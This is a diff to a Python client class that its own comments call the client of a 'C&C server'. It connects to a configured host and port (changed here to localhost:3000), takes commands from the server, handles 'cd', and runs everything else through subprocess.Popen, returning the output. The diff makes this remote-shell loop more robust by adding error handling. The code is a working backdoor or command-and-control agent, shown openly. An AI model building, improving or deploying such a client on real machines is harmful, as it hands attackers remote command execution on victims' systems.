@@ -12,7 +12,7 @@ class client:
     # socket for connection to the server
     sock_to_server = None
     # ip address of our C&C server, can be changed depending on what ip server is located
-    host = '0.0.0.0'
+    host = 'localhost'
     # port of the server to connect to, can be changed depending on what port server is listening at
     port = 3000
 
@@ -115,17 +115,27 @@ class client:
     def run_command(self, cmd):
         # if command from server is cd
         if cmd[:2].decode("utf-8") == "cd":
-            os.chdir(cmd[3:].decode("utf-8"))
+            try:
+                new_dir = cmd[3:].decode("utf-8")
+                if len(new_dir) == 0:
+                    new_dir = os.getenv("HOME")
+                os.chdir(new_dir)
+                return "\n"
+            except Exception as error:
+                return str(error)
 
         # run the command from the server
         if len(cmd) > 0:
-            result = subprocess.Popen(cmd[:].decode("utf-8"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            result_in_bytes = result.stdout.read() + result.stderr.read()
-            result_in_string = str(result_in_bytes, "utf-8")
-            return result_in_string
+            try:
+                result = subprocess.Popen(cmd[:].decode("utf-8"), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result_in_bytes = result.stdout.read() + result.stderr.read()
+                result_in_string = str(result_in_bytes, "utf-8")
+                return result_in_string
+            except Exception as error:
+                return str(error)
 
         # this means the command is empty, returns no result in this case
-        return None
+        return "\n"
 
 
 if  __name__ ==  '__main__':
